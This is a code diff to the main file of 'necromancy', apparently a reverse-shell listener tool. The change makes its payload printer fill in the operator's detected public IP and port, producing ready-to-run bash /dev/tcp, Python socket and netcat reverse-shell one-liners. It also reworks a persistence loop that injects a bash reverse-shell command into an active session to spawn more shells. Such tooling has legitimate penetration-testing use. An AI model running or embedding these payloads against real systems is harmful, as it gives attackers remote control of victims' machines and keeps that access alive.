@@ -15,12 +15,13 @@ import (
 	"github.com/Aryma-f4/necromancy/server"
 	"github.com/Aryma-f4/necromancy/ui"
 	"github.com/Aryma-f4/necromancy/updater"
+	"github.com/Aryma-f4/necromancy/utils"
 	"golang.org/x/term"
 )
 
 // Version variables - will be set by build flags
 var (
-	Version   = "dev"
+	Version   = "v1.2"
 	BuildDate = "unknown"
 )
 
@@ -35,17 +36,34 @@ func splitPorts(raw string) []string {
 	return ports
 }
 
-func showPayloads() {
+func showPayloads(ports string, interfaceAddr string) {
+	// Get network info for IP replacement
+	networkInfo := utils.GetNetworkInfo()
+	localIP := networkInfo["local_ip"]
+	publicIP := networkInfo["public_ip"]
+	if publicIP != "Unknown" && !utils.IsPrivateIP(publicIP) {
+		localIP = publicIP // Use public IP if available
+	}
+
+	// Use the provided ports parameter
+	if ports == "" {
+		ports = "4444"
+	}
+
+	// If multiple ports, use the first one
+	portList := strings.Split(ports, ",")
+	firstPort := strings.TrimSpace(portList[0])
+
 	fmt.Println("Available Reverse Shell Payloads:")
 	fmt.Println("")
 	fmt.Println("Bash:")
-	fmt.Println("bash -i >& /dev/tcp/YOUR_IP/4444 0>&1")
+	fmt.Printf("bash -i >& /dev/tcp/%s/%s 0>&1\n", localIP, firstPort)
 	fmt.Println("")
 	fmt.Println("Python:")
-	fmt.Println(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`)
+	fmt.Printf(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`+"\n", localIP, firstPort)
 	fmt.Println("")
 	fmt.Println("Netcat:")
-	fmt.Println("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f")
+	fmt.Printf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n", localIP, firstPort)
 }
 
 func shouldUseTUI(forceHeadless bool) bool {
@@ -149,7 +167,23 @@ func main() {
 	}
 
 	if showPayloadHints {
-		showPayloads()
+		// Get the port from the flag value since GlobalConfig might not be initialized yet
+		port := "4444" // default
+		for i, arg := range os.Args {
+			if (arg == "-p" || arg == "--ports") && i+1 < len(os.Args) {
+				port = os.Args[i+1]
+				break
+			}
+		}
+		// Get the interface from the flag value
+		interfaceAddr := "0.0.0.0" // default
+		for i, arg := range os.Args {
+			if (arg == "-i" || arg == "--interface") && i+1 < len(os.Args) {
+				interfaceAddr = os.Args[i+1]
+				break
+			}
+		}
+		showPayloads(port, interfaceAddr)
 		os.Exit(0)
 	}
 
@@ -215,8 +249,13 @@ func main() {
 					log.Printf("Persistence: Active sessions (%d) < Target (%d). Attempting to spawn more...", activeCount, core.GlobalConfig.Maintain)
 					// Ask the first active session to spawn another reverse shell
 					s := all[0]
-					payload := fmt.Sprintf("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1 &' 2>/dev/null\n", core.GlobalConfig.Interface, core.GlobalConfig.Ports)
-					s.Write([]byte(payload))
+					// Use the first port from the configured ports
+					ports := splitPorts(core.GlobalConfig.Ports)
+					if len(ports) > 0 {
+						port := ports[0] // Use the first port for persistence
+						payload := fmt.Sprintf("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1 &' 2>/dev/null\n", core.GlobalConfig.Interface, port)
+						s.Write([]byte(payload))
+					}
 				}
 			}
 		}()
